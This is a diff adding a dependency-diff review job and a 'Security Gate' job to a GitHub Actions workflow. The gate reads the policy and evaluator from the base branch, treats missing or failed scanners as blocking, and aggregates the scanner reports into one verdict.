+  # ---------------------------------------------------------------------------
+  # deps-diff-review — what this pull request CHANGES about the dependency tree
+  # ---------------------------------------------------------------------------
+  # The only report policy.yml declares as pull-request-only, and the only one
+  # whose absence on a push is not a failure — there is no "difference" to
+  # review on a branch push. That non-applicability is declared in policy.yml,
+  # so the evaluator allows exactly this skip and nothing else.
+  #
+  # It reads GitHub's Advisory Database directly, live, which makes it a genuine
+  # second source rather than another view of the OSV snapshot. It also only
+  # ever sees the diff, which is precisely why it can never replace deps-osv.
+  deps-diff-review:
+    name: Dependency diff review
+    needs: targets
+    if: github.event_name == 'pull_request'
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    permissions:
+      contents: read
+      pull-requests: read
+    strategy:
+      fail-fast: false
+      matrix:
+        target: ${{ fromJSON(needs.targets.outputs.matrix) }}
+    steps:
+      - name: Check out the assessed revision
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          ref: ${{ matrix.target.sha }}
+          persist-credentials: false
+
+      # warn-only, because this action is not allowed to be the thing that
+      # decides. Its findings are collected below and handed to the gate like
+      # every other scanner's, so one tool cannot enforce a threshold that
+      # differs from policy.yml.
+      - name: Review the dependency difference
+        uses: actions/dependency-review-action@a1d282b36b6f3519aa1f3fc636f609c47dddb294 # v5.0.0
+        with:
+          base-ref: ${{ matrix.target.base_sha }}
+          head-ref: ${{ matrix.target.sha }}
+          warn-only: true
+          comment-summary-in-pr: never
+
+      # The action reports to its own log and job summary; it does not hand back
+      # a machine-readable result. The same data comes from the dependency-graph
+      # comparison API it wraps, flattened here to one record per vulnerable
+      # dependency so the findings reach the register and the report rather than
+      # living only in a log nobody reads after the PR merges.
+      - name: Record the dependency difference for the gate
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          BASE_SHA: ${{ matrix.target.base_sha }}
+          HEAD_SHA: ${{ matrix.target.sha }}
+        run: |
+          set -euo pipefail
+          mkdir -p reports/status
+          gh api "repos/${REPO}/dependency-graph/compare/${BASE_SHA}...${HEAD_SHA}" \
+            > raw-depdiff.json
+          python3 - <<'PY'
+          import json
+          changes = json.load(open("raw-depdiff.json"))
+          out = []
+          for change in changes:
+              if change.get("change_type") != "added":
+                  continue
+              for v in change.get("vulnerabilities") or []:
+                  out.append({
+                      "name": change.get("name"),
+                      "version": change.get("version"),
+                      "ecosystem": change.get("ecosystem"),
+                      "severity": v.get("severity"),
+                      "advisory_ghsa_id": v.get("advisory_ghsa_id"),
+                      "advisory_summary": v.get("advisory_summary"),
+                      "advisory_url": v.get("advisory_url"),
+                  })
+          json.dump(out, open("reports/deps-diff-review.depreview.json", "w"), indent=2)
+          print(f"{len(changes)} dependency change(s), {len(out)} vulnerable addition(s).")
+          PY
+          test -f reports/deps-diff-review.depreview.json
+
+      - name: Record this job's status
+        if: always()
+        run: |
+          mkdir -p reports/status
+          printf '%s\n' "${{ job.status }}" > reports/status/deps-diff-review.status
+
+      - name: Upload the report
+        if: always()
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          name: report-${{ matrix.target.slug }}-deps-diff-review
+          path: reports/
+          retention-days: 30
+          if-no-files-found: error
+
+  # ===========================================================================
+  # THE GATE
+  # ===========================================================================
+  # `name: Security Gate` is load-bearing. It becomes the check-run context that
+  # the branch rulesets require, that dependabot-auto-merge.yml waits on by
+  # name, and that deploy-production.yml refuses to deploy without. NO OTHER JOB
+  # IN THIS REPOSITORY MAY USE THAT NAME — two jobs sharing it would produce two
+  # check runs of the same name and the ruleset would be satisfied by whichever
+  # reported first.
+  #
+  # It runs on `if: always()` so that it still reports when a scanner failed,
+  # was cancelled or was skipped. A gate that only runs when everything upstream
+  # succeeded is not a gate: it is a summary of the happy path, and it goes
+  # missing exactly when something has gone wrong.
+  gate:
+    name: Security Gate
+    needs:
+      - targets
+      - intelligence
+      - deps-osv
+      - deps-trivy
+      - config-trivy
+      - image-trivy
+      - sast-codeql
+      - secrets-gitleaks
+      - deps-diff-review
+    if: always()
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      # THE POLICY COMES FROM THE BASE BRANCH, NOT FROM THE PULL REQUEST.
+      #
+      # This job needs three things from git — policy.yml, exceptions.yml and
+      # evaluate.py — and nothing else; every scan result arrives as an
+      # artifact. If it checked out the pull request instead, a PR could ship a
+      # policy.yml that lowers block_at_or_above, or an evaluate.py that returns
+      # 0, and the Security Gate would go green on the strength of a file the
+      # PR itself wrote. On a public repository anyone can open that PR.
+      #
+      # Checking out the base BRANCH (not base.sha) is deliberate: the policy
+      # that applies is the one on develop right now, not the one that happened
+      # to be there when the branch was cut.
+      - name: Check out the policy and the evaluator from the base branch
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          ref: ${{ github.event_name == 'pull_request' && github.base_ref || github.ref }}
+          persist-credentials: false
+
+      # Bootstrap only, and it announces itself. Until the pull request that
+      # introduces .github/security/ has merged, the base branch has no policy
+      # to enforce and the gate would fail with "cannot read the security
+      # policy" on the very change that adds it. This falls back to the pull
+      # request's own copy and says so loudly. Once the policy is on develop the
+      # branch below is dead code — and the warning is how you would notice if
+      # someone ever deleted the policy from develop.
+      - name: Fall back to the pull request's policy only if the base has none
+        if: github.event_name == 'pull_request'
+        env:
+          # refs/pull/N/head rather than the raw SHA: for a pull request from a
+          # fork the commit lives in this repository only under that ref.
+          PR_REF: refs/pull/${{ github.event.pull_request.number }}/head
+        run: |
+          set -euo pipefail
+          if [ -f .github/security/policy.yml ] && [ -f .github/security/evaluate.py ]; then
+            echo "Enforcing the policy from ${GITHUB_BASE_REF}."
+            exit 0
+          fi
+          echo "::warning title=Security Gate::The base branch carries no .github/security/policy.yml, so this run is enforcing the policy proposed by the pull request itself. This is expected ONLY while bootstrapping the Security Gate."
+          git fetch --no-tags --depth=1 origin "+${PR_REF}:refs/remotes/pull/head"
+          git checkout --force refs/remotes/pull/head -- .github/security
+          test -f .github/security/policy.yml
+          test -f .github/security/evaluate.py
+
+      # PyYAML is the evaluator's only third-party import. It is usually already
+      # present on the runner image; installing it unconditionally is what
+      # breaks on a runner whose system Python is externally managed, so it is
+      # installed only when the import actually fails.
+      - name: Ensure PyYAML is available
+        run: |
+          set -euo pipefail
+          if ! python3 -c 'import yaml' 2>/dev/null; then
+            python3 -m pip install --disable-pip-version-check --quiet 'PyYAML==6.0.3' \
+              || python3 -m pip install --disable-pip-version-check --quiet \
+                   --break-system-packages 'PyYAML==6.0.3'
+          fi
+          python3 -c 'import yaml; print("PyYAML", yaml.__version__)'
+
+      # Downloads everything this run produced. If a job never ran, its artifact
+      # simply is not here — which the evaluator treats as a missing report and
+      # therefore a failure, never as an empty one.
+      #
+      # continue-on-error is here for exactly one case and it errs toward
+      # blocking: if EVERY upstream job died, there are no artifacts at all and
+      # this action fails outright. Letting that stop the job would replace a
+      # policy verdict with an infrastructure error. Continuing hands the
+      # evaluator an empty directory, which it reports as missing reports and
+      # blocks on — the same answer, with a usable explanation.
+      - name: Download every report
+        uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7.0.0
+        with:
+          path: _artifacts
+        continue-on-error: true
+
+      # This is how a skipped, failed or cancelled job reaches the evaluator.
+      #
+      # Each scanner writes its own status as its last step, but a job that was
+      # cancelled — or that died before that step — writes nothing at all, and a
+      # job that was never scheduled writes nothing by definition. `needs.<job>.
+      # result` is the authoritative outcome GitHub itself recorded, so it is
+      # written last and wins. An empty result becomes "missing", which
+      # evaluate.py blocks on.
+      #
+      # One honest limitation, stated rather than hidden: a matrix job's
+      # `result` is the AGGREGATE across its legs. On a scheduled run assessing
+      # both develop and main, a failure on either marks that scanner failed for
+      # BOTH targets. That errs toward blocking, which is the correct direction.
+      - name: Assemble the reports and the authoritative job statuses
+        env:
+          TARGETS: ${{ needs.targets.outputs.matrix }}
+          R_INTELLIGENCE: ${{ needs.intelligence.result }}
+          R_DEPS_OSV: ${{ needs.deps-osv.result }}
+          R_DEPS_TRIVY: ${{ needs.deps-trivy.result }}
+          R_CONFIG_TRIVY: ${{ needs.config-trivy.result }}
+          R_IMAGE_TRIVY: ${{ needs.image-trivy.result }}
+          R_SAST_CODEQL: ${{ needs.sast-codeql.result }}
+          R_SECRETS_GITLEAKS: ${{ needs.secrets-gitleaks.result }}
+          R_DEPS_DIFF_REVIEW: ${{ needs.deps-diff-review.result }}
+        run: |
+          set -euo pipefail
+          python3 - <<'PY'
+          import json, os, shutil
+          from pathlib import Path
+
+          targets = json.loads(os.environ["TARGETS"] or "[]")
+          results = {
+              "deps-osv": os.environ.get("R_DEPS_OSV", ""),
+              "deps-trivy": os.environ.get("R_DEPS_TRIVY", ""),
+              "config-trivy": os.environ.get("R_CONFIG_TRIVY", ""),
+              "image-trivy": os.environ.get("R_IMAGE_TRIVY", ""),
+              "sast-codeql": os.environ.get("R_SAST_CODEQL", ""),
+              "secrets-gitleaks": os.environ.get("R_SECRETS_GITLEAKS", ""),
+              "deps-diff-review": os.environ.get("R_DEPS_DIFF_REVIEW", ""),
+          }
+          arts = Path("_artifacts")
+
+          print(f"intelligence job result: {os.environ.get('R_INTELLIGENCE', '')!r}")
+          for rid, result in results.items():
+              print(f"{rid:20} -> {result or 'missing'}")
+
+          for t in targets:
+              slug = t["slug"]
+              run_dir = Path("run") / slug
+              reports = run_dir / "reports"
+              (reports / "status").mkdir(parents=True, exist_ok=True)
+              (reports / "intel").mkdir(parents=True, exist_ok=True)
+
+              for src in sorted(arts.glob(f"report-{slug}-*")):
+                  shutil.copytree(src, reports, dirs_exist_ok=True)
+
+              intel_src = arts / f"intel-{slug}"
+              if intel_src.is_dir():
+                  shutil.copytree(intel_src, run_dir / "intel", dirs_exist_ok=True)
+
+              # Authoritative, and written last so it overwrites whatever the
+              # job reported about itself.
+              for rid, result in results.items():
+                  (reports / "status" / f"{rid}.status").write_text(
+                      (result or "missing") + "\n")
+
+              print(f"[{slug}] {t['name']} @ {t['sha']}")
+              for p in sorted(reports.rglob("*")):
+                  if p.is_file():
+                      print(f"    {p.relative_to(reports)}  ({p.stat().st_size} bytes)")
+          PY
+
+      # The single decision. Exit 0 passes, exit 1 is blocked by policy, exit 2
+      # means the gate could not be evaluated — both non-zero, and the log and
+      # the report distinguish them, because "I could not assess this" is not
+      # "this is fine".
+      #
+      # No continue-on-error and no `|| true`. If this step fails, the check
+      # fails, and that is the entire purpose of the file.
+      - name: Evaluate the security policy
+        env:
+          TARGETS: ${{ needs.targets.outputs.matrix }}
+          EVENT: ${{ github.event_name }}
+          REPO: ${{ github.repository }}
+          OWNER: ${{ github.repository_owner }}
+        run: |
+          set -euo pipefail
+          worst=0
+          # The register is seeded from the copy committed in the repository so
+          # that first_seen survives, and the updated copy is published as an
+          # artifact. It is NOT written back to git: this workflow has
+          # contents: read and gets no exception, so refreshing the committed
+          # register is a reviewed pull request like any other change.
+          python3 - <<'PY' > target-list.txt
+          import json, os
+          for t in json.loads(os.environ["TARGETS"] or "[]"):
+              print("\t".join([t["slug"], t["ref"], t["sha"], t["name"]]))
+          PY
+
+          # An empty target list means the `targets` job failed and NOTHING was
+          # scanned. Without this guard the loop below would run zero times,
+          # leave `worst` at 0, and report a pass for a run in which no scanner
+          # ever executed — the single most dangerous way for a gate to fail.
+          if [ ! -s target-list.txt ]; then
+            echo "::error title=Security Gate::No assessment target was resolved, so nothing was scanned. That is not a pass."
+            exit 2
+          fi
+
+          while IFS=$'\t' read -r slug ref sha name; do
+            [ -n "$slug" ] || continue
+            echo "::group::Security Gate — $name ($sha)"
+            mkdir -p "out/$slug"
+            if [ -f .github/security/findings.json ]; then
+              cp .github/security/findings.json "out/$slug/findings.json"
+            fi
+            set +e
+            python3 .github/security/evaluate.py \
+              --reports-dir "run/$slug/reports" \
+              --manifest "run/$slug/intel/intelligence-manifest.json" \
+              --policy .github/security/policy.yml \
+              --exceptions .github/security/exceptions.yml \
+              --event "$EVENT" \
+              --ref "$ref" \
+              --revision "$sha" \
+              --repository "$REPO" \
+              --owner "$OWNER" \
+              --workspace "$GITHUB_WORKSPACE" \
+              --register-out "out/$slug/findings.json" \
+              --report-out "out/$slug/report.md"
+            rc=$?
+            set -e
+            echo "::endgroup::"
+            echo "$name ($sha): evaluator exit $rc"
+            # 2 (could not be evaluated) outranks 1 (blocked): if any target
+            # could not be assessed, that is what the run reports.
+            if [ "$rc" -gt "$worst" ]; then worst=$rc; fi
+          done < target-list.txt
+
+          case "$worst" in
+            0) echo "Security Gate: PASSED for every assessed target." ;;
+            1) echo "::error title=Security Gate::Blocked by policy. See the job summary for the findings and the remediation." ;;
+            2) echo "::error title=Security Gate::The gate could NOT be evaluated. A missing scanner, an unreadable report or stale intelligence — this is not a pass." ;;
+          esac
+          exit "$worst"
+
+      - name: Upload the verdict and the findings register
+        if: always()
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          name: security-gate-verdict
+          path: out/
+          retention-days: 90
+          if-no-files-found: warn
